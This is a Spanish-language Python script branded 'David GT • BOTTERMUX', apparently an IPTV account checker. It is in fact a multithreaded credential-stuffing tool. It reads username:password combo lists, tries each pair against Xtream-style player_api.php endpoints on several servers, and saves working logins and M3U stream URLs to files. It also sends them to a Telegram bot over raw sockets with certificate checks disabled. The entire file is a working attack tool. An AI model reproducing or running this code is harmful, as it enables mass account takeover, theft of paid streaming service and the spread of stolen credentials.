#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import json
import socket
import ssl
import threading
import urllib.parse
from datetime import datetime

# ==================== CONFIGURACIÓN ====================
COMBO_DIR = '/sdcard/combo/'
HITS_DIR = '/storage/emulated/0/hits/'
AUTHOR = "David GT"
TELEGRAM = "@DavidGT_IPTV"
MOTTO = "La magia está en el código"
VERSION = "3.0"

# ==================== COLORES ====================
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    
    # Colores principales
    CYAN = '\033[36m'
    BLUE = '\033[34m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'
    GRAY = '\033[90m'
    
    # Fondos
    BG_CYAN = '\033[46m'
    BG_BLUE = '\033[44m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_RED = '\033[41m'
    BG_MAGENTA = '\033[45m'
    
    # Estilos
    H1 = f'{BOLD}{CYAN}'
    H2 = f'{BOLD}{BLUE}'
    SUCCESS = f'{GREEN}'
    WARNING = f'{YELLOW}'
    ERROR = f'{RED}'
    INFO = f'{CYAN}'
    DEBUG = f'{GRAY}'
    BRAND = f'{BOLD}{CYAN}'

# ==================== IMPORTAR REQUESTS ====================
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    SESSION = requests.Session()
except:
    import pip
    pip.main(['install', 'requests'])
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    SESSION = requests.Session()

HEADERS = {
    "Cookie": "stb_lang=en; timezone=America%2FToronto;",
    "X-User-Agent": "Model: MAG254; Link: Ethernet",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
}

# ==================== FUNCIONES DE UI ====================
ANCHO = 40

def limpiar_pantalla():
    os.system('cls' if os.name == 'nt' else 'clear')

def linea(ancho=ANCHO, color=Colors.GRAY):
    return f"{color}─{Colors.RESET}" * ancho

def linea_doble(ancho=ANCHO, color=Colors.CYAN):
    return f"{color}═{Colors.RESET}" * ancho

def centrar(texto, ancho=ANCHO, color=Colors.WHITE):
    if len(texto) >= ancho:
        return f"{color}{texto[:ancho]}{Colors.RESET}"
    espacios = (ancho - len(texto)) // 2
    return " " * espacios + f"{color}{texto}{Colors.RESET}"

def caja_superior(titulo, ancho=ANCHO, color=Colors.CYAN):
    print(f"{color}╔{Colors.RESET}{'═' * (ancho - 2)}{color}╗{Colors.RESET}")
    print(f"{color}║{Colors.RESET}{centrar(titulo, ancho - 2, Colors.BOLD + color)}{color}║{Colors.RESET}")
    print(f"{color}╠{Colors.RESET}{'═' * (ancho - 2)}{color}╣{Colors.RESET}")

def caja_inferior(ancho=ANCHO, color=Colors.CYAN):
    print(f"{color}╚{Colors.RESET}{'═' * (ancho - 2)}{color}╝{Colors.RESET}")

def print_info(msg):
    print(f"{Colors.INFO}[INFO]{Colors.RESET} {msg}")

def print_success(msg):
    print(f"{Colors.SUCCESS}[✓]{Colors.RESET} {msg}")

def print_warning(msg):
    print(f"{Colors.WARNING}[⚠]{Colors.RESET} {msg}")

def print_error(msg):
    print(f"{Colors.ERROR}[✗]{Colors.RESET} {msg}")

def print_debug(msg):
    print(f"{Colors.DEBUG}[DEBUG]{Colors.RESET} {msg}")

def print_brand():
    print(f"""{Colors.BRAND}
    ╔═══════════════════════════════════════╗
    ║         DAVID GT • BOTTERMUX         ║
    ║         {MOTTO}            ║
    ║         v{VERSION}                    ║
    ╚═══════════════════════════════════════╝{Colors.RESET}
    """)

def mostrar_banner():
    limpiar_pantalla()
    print(f"""{Colors.CYAN}
    ╔══════════════════════════════════════════════╗
    ║              DAVID GT                       ║
    ║             BOTTERMUX                      ║
    ║         {MOTTO}             ║
    ║              v{VERSION}                     ║
    ╚══════════════════════════════════════════════╝{Colors.RESET}
    """)

def mostrar_estado_progreso(actual, total, ancho=30):
    porcentaje = (actual / total * 100) if total > 0 else 0
    filled = int(ancho * porcentaje / 100)
    barra = f"{Colors.CYAN}█{Colors.RESET}" * filled + f"{Colors.GRAY}░{Colors.RESET}" * (ancho - filled)
    print(f"  {barra} {porcentaje:.1f}%")
    return porcentaje

# ==================== CLASE TELEGRAM ====================
class TelegramBot:
    def __init__(self):
        self.token = ""
        self.chat_id = ""
        self.enabled = False
        self.last_send = 0
        self.min_interval = 0.5
        
    def configure(self):
        """Configura el bot de Telegram pidiendo token y chat ID por teclado"""
        print(f"\n{linea_doble(ANCHO, Colors.CYAN)}")
        print(centrar("CONFIGURACIÓN DE TELEGRAM", ANCHO, Colors.H1))
        print(linea_doble(ANCHO, Colors.CYAN))
        print(f"\n{Colors.INFO}📌 Para obtener tu Token:{Colors.RESET}")
        print("   1. Abre Telegram")
        print("   2. Busca @BotFather")
        print("   3. Envía /newbot y sigue las instrucciones")
        print("   4. Copia el token que te da (ej: 123456:ABCdef...)\n")
        
        print(f"{Colors.INFO}📌 Para obtener tu Chat ID:{Colors.RESET}")
        print("   1. Envía un mensaje a tu bot")
        print("   2. Visita: https://api.telegram.org/bot<TU_TOKEN>/getUpdates")
        print("   3. Busca 'chat':{{'id':123456789}}\n")
        
        print(linea(ANCHO, Colors.GRAY))
        
        # Solicitar Token
        while True:
            token_input = input(f"{Colors.CYAN}🔑 Ingresa tu Token de Telegram: {Colors.RESET}").strip()
            if token_input:
                self.token = token_input
                break
            print_error("El Token no puede estar vacío\n")
        
        # Solicitar Chat ID
        while True:
            chat_input = input(f"{Colors.CYAN}🆔 Ingresa tu Chat ID de Telegram: {Colors.RESET}").strip()
            if chat_input:
                self.chat_id = chat_input
                break
            print_error("El Chat ID no puede estar vacío\n")
        
        print(f"\n{Colors.SUCCESS}✅ Token: {Colors.RESET}{self.token[:15]}...")
        print(f"{Colors.SUCCESS}✅ Chat ID: {Colors.RESET}{self.chat_id}")
        
        # Preguntar si quiere activar
        print(f"\n{Colors.INFO}¿Activar envío de hits por Telegram?{Colors.RESET}")
        option = input(f"{Colors.CYAN}1 = Sí  2 = No{Colors.RESET}\nElija: ")
        if option != "1":
            self.enabled = False
            print_warning("Telegram desactivado")
            return
        
        # Verificar conexión
        print(f"\n{Colors.INFO}🔄 Verificando conexión con Telegram...{Colors.RESET}")
        if self.test_connection():
            self.enabled = True
            msg = "🚀 IPTV Checker de David GT iniciado!\n✅ Conectado correctamente"
            self.send_message(msg)
            print_success("Conexión exitosa! Mensaje de inicio enviado")
        else:
            self.enabled = False
            print_error("No se pudo conectar a Telegram")
            print("   Verifica que el Token y Chat ID sean correctos")
    
    def test_connection(self):
        """Prueba la conexión con el bot de Telegram"""
        try:
            host = "api.telegram.org"
            path = f"/bot{self.token}/getMe"
            
            request = f"""GET {path} HTTP/1.1
Host: {host}
Connection: close

"""
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, 443))
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.send(request.encode('utf-8'))
            
            response = b""
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except:
                    break
            ssl_sock.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            return '{"ok":true' in response_str
            
        except Exception as e:
            print_error(f"Error de conexión: {e}")
            return False
    
    def send_message(self, message):
        if not self.enabled or not self.token or not self.chat_id:
            return False
        
        if time.time() - self.last_send < self.min_interval:
            time.sleep(self.min_interval)
        
        try:
            host = "api.telegram.org"
            path = f"/bot{self.token}/sendMessage"
            
            msg_encoded = urllib.parse.quote(message)
            body = f"chat_id={self.chat_id}&text={msg_encoded}"
            
            request = f"""POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(body)}
Connection: close

{body}"""
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((host, 443))
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            
            ssl_sock.send(request.encode('utf-8'))
            
            response = b""
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except:
                    break
            ssl_sock.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            if '{"ok":true' in response_str:
                self.last_send = time.time()
                return True
            return False
            
        except Exception as e:
            print_error(f"Error Telegram: {e}")
            return False
    
    def send_hit(self, info):
        if not self.enabled:
            return
        
        username = info.get('username', '')
        password = info.get('password', '')
        server = info.get('server', 'Desconocido')
        status = info.get('status', '')
        exp_date = info.get('exp_date', 'Unlimited')
        
        print(f"\n{Colors.INFO}📤 Enviando hit a Telegram: {username}{Colors.RESET}")
        
        message = f"""
🎯 NUEVO HIT ENCONTRADO

Servidor: {server}
Usuario: {username}
Contraseña: {password}
Estado: {status}
Expira: {exp_date}
Conexiones: {info.get('active_cons', '0')}/{info.get('max_connections', '0')}

Canales: {info.get('get_live_streams_count', '0')}
Películas: {info.get('get_vod_streams_count', '0')}
Series: {info.get('get_series_count', '0')}

URL M3U:
http://{server}/get.php?username={username}&password={password}&type=m3u_plus

M3U - IPTV CHECKER
@DavidGT_IPTV
"""
        self.send_message(message)
    
    def send_summary(self, total_hits, total_processed, elapsed, server_results):
        if not self.enabled:
            return
        
        message = f"""
📊 RESUMEN FINAL - IPTV CHECKER

Hits totales: {total_hits}
Cuentas procesadas: {total_processed}
Tiempo: {elapsed/60:.2f} min
Velocidad: {total_processed/elapsed if elapsed > 0 else 0:.2f} cuentas/seg

Resultados:
"""
        for r in server_results:
            message += f"\n🌐 {r['server'][:30]}: {r['hits']} hits"
        
        message += f"""
M3U - IPTV CHECKER
@DavidGT_IPTV
"""
        self.send_message(message)

# ==================== CLASE SERVER CHECKER ====================
class ServerChecker:
    def __init__(self, portal, server_id, lines, telegram_bot=None):
        self.portal = portal
        self.server_id = server_id
        self.lines = lines
        self.total_lines = len(lines)
        self.hits = 0
        self.processed = 0
        self.running = True
        self.telegram_bot = telegram_bot
        self.hits_lock = threading.Lock()
        self.processed_lock = threading.Lock()
        
    def check_account(self, username, password):
        try:
            url = f"http://{self.portal}/player_api.php?username={username}&password={password}"
            response = SESSION.get(url, headers=HEADERS, timeout=15, verify=False)
            
            if response.status_code != 200:
                return False, "Error HTTP"
            
            data = response.text
            if 'username' not in data:
                return False, "No válido"
            
            status = data.split('status":')[1].split(',')[0].replace('"', '')
            if status == 'Active':
                return True, data
            return False, f"Estado: {status}"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def parse_info(self, data, username, password):
        try:
            info = {
                'server': self.portal,
                'username': username,
                'password': password,
                'status': data.split('status":')[1].split(',')[0].replace('"', ''),
                'active_cons': data.split('active_cons":')[1].split(',')[0].replace('"', ''),
                'max_connections': data.split('max_connections":')[1].split(',')[0].replace('"', ''),
                'exp_date': 'Unlimited',
                'timestamp': datetime.now().isoformat()
            }
            
            if 'exp_date":' in data:
                exp = data.split('exp_date":')[1].split(',')[0].replace('"', '')
                if exp != 'null':
                    info['exp_date'] = datetime.fromtimestamp(int(exp)).strftime('%d-%m-%Y %H:%M:%S')
            
            for action, key in [('get_live_streams', 'stream_id'), ('get_vod_streams', 'stream_id'), ('get_series', 'series_id')]:
                try:
                    url = f"http://{self.portal}/player_api.php?username={username}&password={password}&action={action}"
                    r = SESSION.get(url, headers=HEADERS, timeout=15, verify=False)
                    info[f'{action}_count'] = str(r.text.count(key)) if r.status_code == 200 else '0'
                except:
                    info[f'{action}_count'] = '0'
            
            return info
        except:
            return {}
    
    def save_hit(self, info):
        try:
            os.makedirs(HITS_DIR, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f'{HITS_DIR}HIT_{self.portal.replace(":", "_")}_{timestamp}.txt'
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"""
Hit encontrado por David GT
=========================
Servidor: {self.portal}
Usuario: {info.get('username', '')}
Contraseña: {info.get('password', '')}
Estado: {info.get('status', '')}
Expira: {info.get('exp_date', '')}
Conexiones: {info.get('active_cons', '0')}/{info.get('max_connections', '0')}
Canales: {info.get('get_live_streams_count', '0')}
Películas: {info.get('get_vod_streams_count', '0')}
Series: {info.get('get_series_count', '0')}
URL M3U: http://{self.portal}/get.php?username={info.get('username', '')}&password={info.get('password', '')}&type=m3u_plus
Encontrado: {info.get('timestamp', '')}
=========================
M3U - IPTV CHECKER
@DavidGT_IPTV
""")
            
            if self.telegram_bot and self.telegram_bot.enabled:
                threading.Thread(target=self.telegram_bot.send_hit, args=(info,), daemon=True).start()
            
            return filename
        except Exception as e:
            return None
    
    def process_account(self, username, password):
        with self.processed_lock:
            self.processed += 1
        
        is_active, result = self.check_account(username, password)
        
        if is_active:
            with self.hits_lock:
                self.hits += 1
            info = self.parse_info(result, username, password)
            self.save_hit(info)
            return True
        return False
    
    def worker(self, start, step):
        for i in range(start, self.total_lines, step):
            if not self.running:
                break
            
            try:
                line = self.lines[i].strip()
                if ':' not in line:
                    continue
                
                username, password = line.split(':', 1)
                self.process_account(username.strip(), password.strip())
            except:
                continue
    
    def run(self, bots):
        threads = []
        for i in range(bots):
            t = threading.Thread(target=self.worker, args=(i, bots))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return self.hits

# ==================== CLASE PRINCIPAL ====================
class MultiServerChecker:
    def __init__(self):
        self.telegram_bot = TelegramBot()
        self.start_time = time.time()
    
    def clear_screen(self):
        limpiar_pantalla()
    
    def banner(self):
        mostrar_banner()
    
    def list_combos(self):
        combos = {}
        try:
            files = [f for f in os.listdir(COMBO_DIR) if f.endswith('.txt')]
            if not files:
                print_error("No se encontraron combos en /sdcard/combo/")
                return {}
            
            print(f"\n{linea(ANCHO, Colors.GRAY)}")
            print(centrar("COMBOS DISPONIBLES", ANCHO, Colors.H1))
            print(linea(ANCHO, Colors.GRAY))
            for i, file in enumerate(files, 1):
                combos[i] = file
                nombre = file if len(file) <= 40 else file[:37] + "..."
                print(f"  {Colors.CYAN}{i:2d}{Colors.RESET}) {nombre}")
            return combos
        except Exception as e:
            print_error(f"Error: {e}")
            return {}
    
    def select_combo(self, combos):
        while True:
            try:
                sel = input(f"\n{linea(ANCHO, Colors.GRAY)}\n{Colors.CYAN}Elija combo (número): {Colors.RESET}")
                if sel.isdigit():
                    num = int(sel)
                    if num in combos:
                        return os.path.join(COMBO_DIR, combos[num])
                print_error("Opción no válida")
            except:
                return None
    
    def select_bots(self):
        print(f"\n{linea(ANCHO, Colors.GRAY)}")
        print(centrar("CONFIGURACIÓN DE BOTS", ANCHO, Colors.H1))
        print(linea(ANCHO, Colors.GRAY))
        print(f"\n{Colors.INFO}Recomendación:{Colors.RESET}")
        print("  • 1-5 bots:  Dispositivos básicos")
        print("  • 5-10 bots: 2-4GB RAM")
        print("  • 10-20 bots: 4GB+ RAM\n")
        
        while True:
            try:
                bots_input = input(f"{Colors.CYAN}¿Cuántos bots por servidor? (1-20): {Colors.RESET}")
                if bots_input.isdigit():
                    num = int(bots_input)
                    if 1 <= num <= 20:
                        return num
                print_error("Ingrese un número entre 1 y 20")
            except:
                return 1
    
    def get_servers(self):
        servers = []
        print(f"\n{linea(ANCHO, Colors.GRAY)}")
        print(centrar("CONFIGURACIÓN DE SERVIDORES", ANCHO, Colors.H1))
        print(linea(ANCHO, Colors.GRAY))
        print(f"\n{Colors.DIM}Presione Enter sin escribir para finalizar{Colors.RESET}\n")
        
        for i in range(10):
            portal_input = input(f"{Colors.CYAN}Servidor {i+1} (ej: portal.com:8080): {Colors.RESET}")
            if not portal_input:
                if servers:
                    break
                else:
                    print_error("Debe agregar al menos un servidor")
                    continue
            
            portal = portal_input.replace("http://", "").replace("https://", "").replace("/", "")
            servers.append(portal)
            
            if i < 9:
                cont = input(f"{Colors.CYAN}Agregar otro? (s/n): {Colors.RESET}").lower()
                if cont != 's':
                    break
        
        return servers
    
    def load_combo(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            return [l.strip() for l in lines if l.strip()]
        except Exception as e:
            print_error(f"Error: {e}")
            return None
    
    def mostrar_estado(self, checkers):
        total_hits = sum(c.hits for c in checkers)
        total_processed = sum(c.processed for c in checkers)
        total_lines = sum(c.total_lines for c in checkers)
        elapsed = time.time() - self.start_time
        
        # Limpiar líneas anteriores
        print("\033[F" * 15, end="")
        
        print(f"\n{linea_doble(ANCHO, Colors.CYAN)}")
        print(centrar("DAVID GT • LIVE PANEL", ANCHO, Colors.H1))
        print(linea_doble(ANCHO, Colors.CYAN))
        
        # Estado
        estado = f"{Colors.SUCCESS}▶ RUNNING{Colors.RESET}"
        print(f"  {Colors.CYAN}Estado{Colors.RESET}      : {estado}")
        
        # Tiempo
        horas = int(elapsed // 3600)
        minutos = int((elapsed % 3600) // 60)
        segundos = int(elapsed % 60)
        tiempo_str = f"{horas:02d}:{minutos:02d}:{segundos:02d}"
        print(f"  {Colors.CYAN}Tiempo{Colors.RESET}      : {tiempo_str}")
        
        # Progreso
        print(f"  {Colors.CYAN}Procesados{Colors.RESET}  : {total_processed}")
        print(f"  {Colors.CYAN}Hits{Colors.RESET}        : {Colors.SUCCESS}{total_hits}{Colors.RESET}")
        print(f"  {Colors.CYAN}Velocidad{Colors.RESET}   : {total_processed/elapsed if elapsed > 0 else 0:.1f} c/s")
        
        # Barra de progreso
        progreso = (total_processed / total_lines * 100) if total_lines > 0 else 0
        barra_len = 25
        filled = int(barra_len * progreso / 100)
        barra = f"{Colors.CYAN}█{Colors.RESET}" * filled + f"{Colors.GRAY}░{Colors.RESET}" * (barra_len - filled)
        print(f"  {Colors.CYAN}Progreso{Colors.RESET}    : {barra} {progreso:.1f}%")
        
        print(linea(ANCHO, Colors.GRAY))
        
        # Servidores
        for c in checkers:
            progress = (c.processed / c.total_lines * 100) if c.total_lines > 0 else 0
            nombre = c.portal[:28] if len(c.portal) <= 28 else c.portal[:25] + "..."
            hit_color = Colors.SUCCESS if c.hits > 0 else Colors.GRAY
            print(f"  {Colors.CYAN}🌐{Colors.RESET} {nombre:<28} {hit_color}{c.hits:>4}{Colors.RESET} hits {progress:>5.1f}%")
        
        print(linea_doble(ANCHO, Colors.CYAN))
        print(f"{Colors.DIM}Presione Ctrl+C para detener{Colors.RESET}")
    
    def run(self):
        try:
            self.clear_screen()
            self.banner()
            
            # ===== CONFIGURAR TELEGRAM =====
            self.telegram_bot.configure()
            
            # ===== SELECCIONAR COMBO =====
            combos = self.list_combos()
            if not combos:
                return
            
            combo_path = self.select_combo(combos)
            if not combo_path:
                return
            
            lines = self.load_combo(combo_path)
            if not lines:
                return
            
            print_success(f"Combo cargado: {len(lines)} cuentas")
            
            # ===== CONFIGURAR BOTS =====
            bots = self.select_bots()
            
            # ===== CONFIGURAR SERVIDORES =====
            servers = self.get_servers()
            if not servers:
                return
            
            print_success(f"Servidores: {len(servers)}")
            for i, s in enumerate(servers, 1):
                print(f"  {Colors.CYAN}{i}.{Colors.RESET} {s}")
            
            # ===== EJECUTAR =====
            self.start_time = time.time()
            server_checkers = []
            
            for i, server in enumerate(servers, 1):
                print_info(f"Iniciando servidor {i}: {server}")
                checker = ServerChecker(server, i, lines.copy(), self.telegram_bot)
                server_checkers.append(checker)
            
            # Guardar posición inicial del cursor
            print("\n" * 15)
            
            threads = []
            for checker in server_checkers:
                t = threading.Thread(target=checker.run, args=(bots,))
                t.daemon = True
                threads.append(t)
                t.start()
            
            try:
                while any(t.is_alive() for t in threads):
                    self.mostrar_estado(server_checkers)
                    time.sleep(1.5)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}⏹️ Deteniendo...{Colors.RESET}")
                for c in server_checkers:
                    c.running = False
                time.sleep(2)
            
            # ===== RESUMEN FINAL =====
            total_hits = sum(c.hits for c in server_checkers)
            total_processed = sum(c.processed for c in server_checkers)
            elapsed = time.time() - self.start_time
            
            server_results = [{'server': c.portal, 'hits': c.hits} for c in server_checkers]
            
            if self.telegram_bot.enabled:
                self.telegram_bot.send_summary(total_hits, total_processed, elapsed, server_results)
            
            # Limpiar panel en vivo
            print("\033[F" * 20, end="")
            
            print(f"\n{linea_doble(ANCHO, Colors.CYAN)}")
            print(centrar("DAVID GT • EXECUTION SUMMARY", ANCHO, Colors.H1))
            print(linea_doble(ANCHO, Colors.CYAN))
            
            horas = int(elapsed // 3600)
            minutos = int((elapsed % 3600) // 60)
            segundos = int(elapsed % 60)
            
            print(f"  {Colors.CYAN}Estado{Colors.RESET}        : {Colors.SUCCESS}COMPLETED{Colors.RESET}")
            print(f"  {Colors.CYAN}Tiempo total{Colors.RESET} : {horas:02d}:{minutos:02d}:{segundos:02d}")
            print(f"  {Colors.CYAN}Procesados{Colors.RESET}   : {total_processed}")
            print(f"  {Colors.CYAN}Hits{Colors.RESET}         : {Colors.SUCCESS}{total_hits}{Colors.RESET}")
            print(f"  {Colors.CYAN}Velocidad{Colors.RESET}    : {total_processed/elapsed if elapsed > 0 else 0:.1f} c/s")
            
            print(linea(ANCHO, Colors.GRAY))
            for c in server_checkers:
                nombre = c.portal[:30] if len(c.portal) <= 30 else c.portal[:27] + "..."
                hit_color = Colors.SUCCESS if c.hits > 0 else Colors.GRAY
                print(f"  {Colors.CYAN}🌐{Colors.RESET} {nombre:<30} {hit_color}{c.hits:>4}{Colors.RESET} hits")
            
            print(linea(ANCHO, Colors.GRAY))
            print(f"  {Colors.CYAN}📁 Hits guardados en:{Colors.RESET} {HITS_DIR}")
            if self.telegram_bot.enabled:
                print(f"  {Colors.CYAN}🤖 Telegram:{Colors.RESET} {Colors.SUCCESS}✅ Activo{Colors.RESET}")
            print(linea_doble(ANCHO, Colors.CYAN))
            
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}⏹️ Proceso interrumpido{Colors.RESET}")
        except Exception as e:
            print_error(f"Error: {e}")

# ==================== MAIN ====================
if __name__ == "__main__":
    checker = MultiServerChecker()
    checker.run()